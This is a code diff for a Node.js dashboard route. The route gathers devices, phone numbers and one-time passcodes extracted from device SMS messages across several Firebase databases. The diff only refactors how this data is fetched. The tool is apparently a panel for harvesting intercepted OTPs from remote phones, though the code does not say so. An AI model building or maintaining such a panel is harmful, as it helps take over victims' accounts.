@@ -10,6 +10,7 @@ const ConnectionsService = require("../services/connections");
 const FirebaseService = require("../services/firebase");
 const DeviceService = require("../services/devices");
 const OtpExtractor = require("../services/otpExtractor");
+const { getPhone } = require("../utils/phone");
 const { requireAuth } = require("../middleware/auth");
 
 const router = Router();
@@ -23,49 +24,32 @@ router.get("/", async (req, res, next) => {
   try {
     const connections = await ConnectionsService.getAllActive();
 
-    // Fetch devices from all connections in parallel
-    const deviceResults = await Promise.allSettled(
-      connections.map(async (conn) => {
-        try {
-          const clientsData = await FirebaseService.read(conn.url, conn.key, "clients");
-          const devices = DeviceService.parseAll(clientsData);
-          return devices.map((d) => ({ ...d, source: conn.name }));
-        } catch {
-          return [];
-        }
-      })
-    );
-
-    // Flatten all devices
-    const allDevices = [];
-    for (const result of deviceResults) {
-      if (result.status === "fulfilled") allDevices.push(...result.value);
-    }
-
-    // Sort: online first
-    allDevices.sort((a, b) => {
-      if (a.status !== b.status) return a.status ? -1 : 1;
-      return a.name.localeCompare(b.name);
-    });
-
-    // Fetch recent OTPs from all connections
-    const otpResults = await Promise.allSettled(
+    // Fetch each connection once, then build its device and OTP data together.
+    const connectionResults = await Promise.allSettled(
       connections.map(async (conn) => {
         try {
           const [clientsData, messagesRoot] = await Promise.all([
             FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
             FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
           ]);
-          const devices = DeviceService.parseAll(clientsData);
+          const normalizedDevices = DeviceService.parseAll(clientsData);
+          const devices = normalizedDevices.map((device) => ({
+            ...device,
+            phoneNumber: getPhone(
+              device,
+              clientsData?.[device.id],
+              messagesRoot?.[device.id]
+            ) || "—",
+            source: conn.name,
+          }));
           const otps = [];
+
           if (messagesRoot && typeof messagesRoot === "object") {
             for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
               if (!deviceMessages || typeof deviceMessages !== "object") continue;
-              const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
 
-              // Get phone DIRECTLY from normalized device data
-              const phone = (device && device.phoneNumber && device.phoneNumber !== "—")
-                ? device.phoneNumber : "";
+              const device = normalizedDevices.find((item) => item.id === deviceId);
+              const phone = getPhone(device, clientsData?.[deviceId], deviceMessages);
 
               for (const [, msg] of Object.entries(deviceMessages)) {
                 if (!msg || typeof msg !== "object") continue;
@@ -86,15 +70,26 @@ router.get("/", async (req, res, next) => {
               }
             }
           }
-          return otps;
-        } catch { return []; }
+
+          return { devices, otps };
+        } catch {
+          return { devices: [], otps: [] };
+        }
       })
     );
 
+    const allDevices = [];
     const allOtps = [];
-    for (const r of otpResults) {
-      if (r.status === "fulfilled") allOtps.push(...r.value);
+    for (const result of connectionResults) {
+      if (result.status !== "fulfilled") continue;
+      allDevices.push(...result.value.devices);
+      allOtps.push(...result.value.otps);
     }
+
+    allDevices.sort((a, b) => {
+      if (a.status !== b.status) return a.status ? -1 : 1;
+      return a.name.localeCompare(b.name);
+    });
     allOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
     res.json({
@@ -132,7 +127,11 @@ router.get("/devices/:id", async (req, res, next) => {
           const messages = await FirebaseService.read(conn.url, conn.key, `messages/${id}`).catch(() => null);
           return res.json({
             success: true,
-            device: { ...device, source: conn.name },
+            device: {
+              ...device,
+              phoneNumber: getPhone(device, raw, messages) || "—",
+              source: conn.name,
+            },
             messages: messages ? DeviceService.parseMessages(messages) : [],
           });
         }
